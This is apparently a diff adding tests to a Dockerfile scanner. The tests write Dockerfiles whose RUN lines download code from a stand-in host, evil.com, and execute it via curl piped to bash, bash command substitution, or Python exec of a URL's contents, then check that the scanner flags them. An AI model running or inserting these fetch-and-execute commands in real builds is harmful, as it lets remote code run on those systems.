@@ -273,3 +273,19 @@ def test_backslash_continuation_curl_bash(tmp_path):
     df.write_text("FROM python:3.12\nRUN curl https://evil.com/x.sh \\\n    | bash\nUSER app\n")
     findings = scan_dockerfile(str(df))
     assert any(f.rule == "curl-pipe-shell" for f in findings)
+
+
+def test_command_substitution_curl(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text('FROM python:3.12\nRUN bash -c "$(curl https://evil.com)"\nUSER app\n')
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "curl-pipe-shell" for f in findings)
+
+
+def test_python_inline_remote_exec(tmp_path):
+    from vibefort.dockerscan import scan_dockerfile
+    df = tmp_path / "Dockerfile"
+    df.write_text('FROM python:3.12\nRUN python -c "import urllib.request; exec(urllib.request.urlopen(\'https://evil.com\').read())"\nUSER app\n')
+    findings = scan_dockerfile(str(df))
+    assert any(f.rule == "curl-pipe-shell" for f in findings)
